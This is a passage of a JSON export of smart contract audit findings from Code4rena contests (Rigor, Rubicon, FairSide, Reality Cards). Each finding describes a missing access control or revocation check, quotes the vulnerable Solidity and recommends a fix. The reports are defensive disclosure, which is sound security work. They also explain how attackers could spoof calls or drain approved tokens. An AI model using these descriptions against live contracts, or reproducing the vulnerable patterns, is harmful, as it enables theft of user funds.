        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Notional",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "3124",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "176",
      "title": "[M-20] `Project.sol` and `Community.sol` have no way to revoke a hash in approvedHashes",
      "content": "_Submitted by 0x52_\n\n[Community.sol#L501-L506](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L501-L506)<br>\n[Project.sol#L108-L115](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108-L115)<br>\n\nUser is unable to revoke previously approved hash.\n\n### Proof of Concept\n\nIf user reconsiders or notices something malicious about the hash after signing, they should be able to revoke the hash. For example the user approves a hash only to find out later that the hash has been spoofed and they weren't approving what they thought they were. To protect themselves the user should be able to revoke approval, otherwise it may lead to loss of funds or access.\n\n### Recommended Mitigation Steps\n\nAdd the following function:\n\n    function revokeHash(bytes32 _hash) external virtual {\n        approvedHashes[_msgSender()][_hash] = false;\n    }\n\n**[parv3213 (Rigor) disputed and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/64#issuecomment-1243284914):**\n > I do not find it essential to revoke a hash. As off-chain signatures can never be marked as invalid, adding this feature for on-chain signatures makes no sense. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that prevents users from revoking a previously approved hash. This means that if the user reconsiders or notices something malicious about the hash after signing, they are not able to revoke it. This could lead to loss of funds or access. To mitigate this issue, the report recommends adding a function called revokeHash which will allow users to revoke the hash. The code for the function is provided in the report.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-08-rigor-protocol-contest",
      "sponsor_name": "Rigor Protocol",
      "sponsor_link": "https://twitter.com/Rigor_HQ",
      "quality_score": 4,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/64",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "151",
      "slug": "m-20-projectsol-and-communitysol-have-no-way-to-revoke-a-hash-in-approvedhashes-code4rena-rigor-protocol-rigor-protocol-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Rigor Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Rigor Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Business Logic"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "2528",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "216",
      "title": "[M-31] Lack of Access Control for offer(uint, ERC20, uint, ERC20) and insert(uint, unint)",
      "content": "_Submitted by xiaoming90, also found by throttle_\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L598>\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L697>\n\n### Proof of Concept\n\nThe `offer(uint, ERC20, uint, ERC20)` and `insert(uint, unint)` should only be accessible by the keepers as per the comments. However, there is no authorisation logic or access control implemented. Therefore, anyone could call these two functions.\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L598>\n\n```solidity\n// Make a new offer. Takes funds from the caller into market escrow.\n//\n// If matching is enabled:\n//     * creates new offer without putting it in\n//       the sorted list.\n//     * available to authorized contracts only!\n//     * keepers should call insert(id,pos)\n//       to put offer in the sorted list.\n//\n// If matching is disabled:\n//     * calls expiring market's offer().\n//     * available to everyone without authorization.\n//     * no sorting is done.\n//\nfunction offer(\n    uint256 pay_amt, //maker (ask) sell how much\n    ERC20 pay_gem, //maker (ask) sell which token\n    uint256 buy_amt, //taker (ask) buy how much\n    ERC20 buy_gem //taker (ask) buy which token\n) public override returns (uint256) {\n    require(!locked, \"Reentrancy attempt\");\n\n\n        function(uint256, ERC20, uint256, ERC20) returns (uint256) fn\n     = matchingEnabled ? _offeru : super.offer;\n    return fn(pay_amt, pay_gem, buy_amt, buy_gem);\n}\n```\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L697>\n\n```solidity\n//insert offer into the sorted list\n//keepers need to use this function\nfunction insert(\n    uint256 id, //maker (ask) id\n    uint256 pos //position to insert into\n) public returns (bool) {\n    require(!locked, \"Reentrancy attempt\");\n    require(!isOfferSorted(id)); //make sure offers[id] is not yet sorted\n    require(isActive(id)); //make sure offers[id] is active\n\n    _hide(id); //remove offer from unsorted offers list\n    _sort(id, pos); //put offer into the sorted offers list\n    emit LogInsert(msg.sender, id);\n    return true;\n}\n```\n\n### Impact\n\nFollowing are the three offers functions that public users can use to place new orders\n\n*   offer(uint, ERC20, uint, ERC20, uint)\n*   offer(uint, ERC20, uint, ERC20, uint, bool)\n*   offer(uint, ERC20, uint, ERC20)\n\nPer the [OasisDex Documentation](https://oasisdex.com/docs/references/smart-contract#orderbook-navigation), which Rubicon Market based upon, the last order (`offer(uint, ERC20, uint, ERC20)`) method should not be used. Following is the extract from the documentation.\n\n> This method IS NOT recommended and shouldn't be used. Such an offer would not end up in the sorted list but would rather need to be inserted by a keeper at a later date. There is no guarantee that this will ever happen.\n\n`offer(uint, ERC20, uint, ERC20)` and `insert(uint, unint)` should be reserved for authorized users (e.g. keepers) only, but the fact is that anyone could access.\n\nThe functions `offer(uint,ERC20,uint,ERC20,uint)` and `offer(uint,ERC20,uint,ERC20,uint,bool)` will trigger the matching logic, but the function `offer(uint,ERC20,uint,ERC20)` does not.\n\nThe function `offer(uint,ERC20,uint,ERC20)` allows malicious user to manipulate the orderbook in an atomic transaction by submitting a order without it being atomically matched, and then `insert(uint,uint)` can be used in order to manually sort the order without triggering matching.\n\nThese additional interfaces might potentially allow attacker to implement sophisticated techniques to compromise the protocol in the future. These two interfaces have been utilised by malicious users in the past to manipulate the orderbook, see <https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/> (Eth2Dai Section)\n\n### Recommended Mitigation Steps\n\nReview if `offer(uint, ERC20, uint, ERC20)` and `insert(uint, unint)` is needed. If these function are not needed, it is recommended to remove these functions to reduce the attack surface of the protocol. If these functions are needed, implement the necessary access controls to ensure only authorised users can access.\n\n**[bghughes (Rubicon) disputed and commented](https://github.com/code-423n4/2022-05-rubicon-findings/issues/110#issuecomment-1146679961):**\n > I believe this should be informational as it is a feature to allow for users to create offers outside of the sorted list. Them then `inserting` that offer into the list seems like appropriate functionality to me.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-05-rubicon-findings/issues/110#issuecomment-1163321838):**\n > The warden has referenced a past attack vector demonstrated by the legendary samczsun that exploited the exact same functions to manipulate prices, as well as OasisDex's documentation, which makes the issue a very strong case.\n> \n> Have to therefore disagree that it's appropriate functionality. The functions mentioned by the warden should be removed to prevent potential integrations from being exploited the same way.\n> \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about two functions in a smart contract, namely `offer(uint, ERC20, uint, ERC20)` and `insert(uint, unint)`, which should only be accessible by authorized users (e.g. keepers). However, there is no authorisation logic or access control implemented, which means anyone can call these two functions. This bug affects the Rubicon Market, which is based on the OasisDex Documentation. The function `offer(uint,ERC20,uint,ERC20)` allows malicious users to manipulate the orderbook in an atomic transaction by submitting a order without it being atomically matched, and then `insert(uint,uint)` can be used to manually sort the order without triggering matching. This could potentially allow attackers to implement sophisticated techniques to compromise the protocol in the future. \n\nThe recommended mitigation steps are to review if `offer(uint, ERC20, uint, ERC20)` and `insert(uint, unint)` is needed. If these functions are not needed, it is recommended to remove them to reduce the attack surface of the protocol. If these functions are needed, access controls should be implemented to ensure only authorised users can access them.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-05-rubicon-contest",
      "sponsor_name": "Rubicon",
      "sponsor_link": "https://twitter.com/rubicondefi",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2022-05-rubicon",
      "github_link": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/110",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "129",
      "slug": "m-31-lack-of-access-control-for-offeruint-erc20-uint-erc20-and-insertuint-unint-code4rena-rubicon-rubicon-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Rubicon",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Rubicon",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "980",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 6,
      "protocol_id": "353",
      "title": "[H-01] Anyone Can Arbitrarily Call FSDVesting.updateVestedTokens()",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `updateVestedTokens()` function is intended to be called by the `FSD.sol` contract when updating a user's vested token amount. A check is performed to ensure that `_user == beneficiary`, however, as `_user` is a user controlled argument, it is possible to spoof calls to `updateVestedTokens()` such that anyone can arbitrarily add any amount to the vested contract. Additionally, there is no check to ensure that the call originated from a trusted/whitelisted source.\n\nThere are two main reasons as to why the beneficiary or an attacker would want to call this function:\n- To increase the vested amount such that `calculateVestingClaim()` allows them to withdraw their entire vested amount without waiting the entire duration.\n- An attacker wishes to block withdrawals from other vested contracts by preventing successful calls to `claimVestedTokens()` by the beneficiary account. This can be done by increasing the vested amount such that `safeTransfer()` calls fail due to insufficient token balance within the contract.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L147-L161\nhttps://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L100-L115\nhttps://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L125\nhttps://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L134\n\n## Tools Used\n\nManual code review.\nDiscussions with dev.\n\n## Recommended Mitigation Steps\n\nEnsure that the `updateVestedTokens()` function is only callable from the `FSD.sol` contract. This can be done by implementing an `onlyFSD` role.",
      "summary": "\nThis bug report concerns the `updateVestedTokens()` function in the `FSDVesting.sol` contract. This function is intended to be called by the `FSD.sol` contract when updating a user's vested token amount. However, a check is not performed to make sure that the call originates from a trusted source, meaning that anyone can call this function and add any amount to the vested contract. \n\nThere are two main reasons why the beneficiary or an attacker would want to call this function: to increase the vested amount such that `calculateVestingClaim()` allows them to withdraw their entire vested amount without waiting the entire duration, or to block withdrawals from other vested contracts by preventing successful calls to `claimVestedTokens()`.\n\nThe bug was identified through manual code review and discussions with the development team. The recommended mitigation step is to ensure that the `updateVestedTokens()` function is only callable from the `FSD.sol` contract by implementing an `onlyFSD` role.",
      "report_date": {},
      "contest_prize_txt": "$30,000 worth of ETH",
      "contest_link": "https://code4rena.com/contests/2021-11-fairside-contest",
      "sponsor_name": "FairSide",
      "sponsor_link": "https://twitter.com/FairsideNetwork",
      "quality_score": 3,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2021-11-fairside",
      "github_link": "https://github.com/code-423n4/2021-11-fairside-findings/issues/101",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "50",
      "slug": "h-01-anyone-can-arbitrarily-call-fsdvestingupdatevestedtokens-code4rena-fairside-fairside-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "FairSide",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "FairSide",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "289",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 4,
      "protocol_id": "398",
      "title": "[H-03] anyone can call function sponsor",
      "content": "## Handle\n\npauliax\n\n\n## Vulnerability details\n\n## Impact\nThis function sponsor should only be called by the factory, however, it does not have any auth checks, so that means anyone can call it with an arbitrary _sponsorAddress address and transfer tokens from them if the allowance is > 0:\n    /// @notice ability to add liqudity to the pot without being able to win.\n    /// @dev called by Factory during market creation\n    /// @param _sponsorAddress the msgSender of createMarket in the Factory\n    function sponsor(address _sponsorAddress, uint256 _amount)\n        external\n        override\n    {\n        _sponsor(_sponsorAddress, _amount);\n    }\n\n## Recommended Mitigation Steps\nCheck that the sender is a factory contract.",
      "summary": "\nThis bug report is about a vulnerability in a function called \"sponsor\" which should only be called by the factory but does not have any authentication checks. This means anyone can call it with an arbitrary sponsor address and transfer tokens from them if the allowance is greater than 0. The recommended mitigation step for this vulnerability is to check that the sender is a factory contract.",
      "report_date": {},
      "contest_prize_txt": "$45,000 USDC (plus tokens)",
      "contest_link": "https://code4rena.com/contests/2021-06-reality-cards-contest",
      "sponsor_name": "Reality Cards",
      "sponsor_link": "https://twitter.com/realitycards",
      "quality_score": 5,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/40",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "13",
      "slug": "h-03-anyone-can-call-function-sponsor-code4rena-reality-cards-reality-cards-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Reality Cards",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Reality Cards",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    }
  ]
}